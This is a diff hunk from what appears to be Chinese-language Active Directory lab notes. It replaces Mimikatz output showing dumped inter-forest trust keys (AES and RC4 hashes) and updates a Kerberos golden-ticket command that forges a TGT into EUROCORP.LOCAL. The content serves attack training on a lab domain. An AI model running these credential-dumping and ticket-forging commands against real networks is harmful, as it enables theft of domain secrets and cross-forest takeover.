@@ -2518,15 +2518,15 @@ Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc.dollar
 
 Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-1652071801-1423090587-98612180)
  [  In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
-    * 1/29/2022 1:20:05 AM - CLEAR   - 1f 6f c4 25 57 c2 50 6e e2 8c b8 94 07 da 97 13 cc 89 5d 6d 0e 47 05 91 74 7c 3a c1
-        * aes256_hmac       91df6bcc4a71d585b710532ff73b662d43e4d83a00821f7d509319e4ce1897c5
-        * aes128_hmac       47f41fc169b79c34d8af08afa3cfdde9
-        * rc4_hmac_nt       cccb3ce736c4d39039b48c79f075a430
+    * 3/1/2022 2:16:24 AM - CLEAR   - 21 ab 4b bc 55 7f 24 20 7d 78 38 e1 4b 66 5b b5 c0 57 d5 8d 10 0a 88 93 3a d6 66 b9 fe ec 4a b0 37 e4 89 67 b2 37 f2 fa 1e e5 fc 97 76 3e 20 66 04 28 e9 7e 74 19 b3 3d 4f bc 13 0f 0f cf bd d3 21 86 5c 15 dc 2f 93 a7 70 51 dd 95 e7 dc 6f 52 45 92 a3 82 37 23 d1 32 c8 db 27 3a a0 6d 49 7b 7e b2 eb be a8 24 09 8a 99 d0 2f 70 40 52 5f 49 e5 d4 1f 5b 4f 0f 60 bf fb e3 4d 81 27 9f 56 db f0 41 09 96 e8 5b e0 95 6d 64 43 b9 fa 48 ee a1 bd 82 1b ba 46 cc 89 90 8f b1 15 50 97 6b 57 cb b1 82 fc 24 a0 e3 8b 03 8b ef c4 58 1a cf 8f 23 e2 10 53 e2 a8 95 4d 14 46 70 12 cf 53 d8 59 d3 35 04 32 a5 76 01 16 18 22 e8 a5 49 80 e9 06 5a 5d 42 dd 37 c7 73 87 bd 79 ab a9 ec c5 e9 8c f4 bf a1 c6 03 83 d8 61 86 5e 57 04 4a 15 39 64 c4
+        * aes256_hmac       46a53eca6c7a8f4ae425ca05f79bfbb31b7da987a21b9cb88d70da22f63c924e
+        * aes128_hmac       3451fe279e16ea5f7defb896cf7b99ca
+        * rc4_hmac_nt       533b4264770857e124caf3b04fc5a503
 ```
 
 伪造一条到EUROCORP.LOCAL的TGT
 ```
-Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:cccb3ce736c4d39039b48c79f075a430 /service:krbtgt /target:EUROCORP.LOCAL /ticket:C:\AD\kekeo_old\trust_forest_tkt.kirbi"'
+Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:533b4264770857e124caf3b04fc5a503 /service:krbtgt /target:EUROCORP.LOCAL /ticket:C:\AD\kekeo_old\trust_forest_tkt.kirbi"'
 ```
 
 制作一张可以访问EUROCORP.LOCAL的TGS
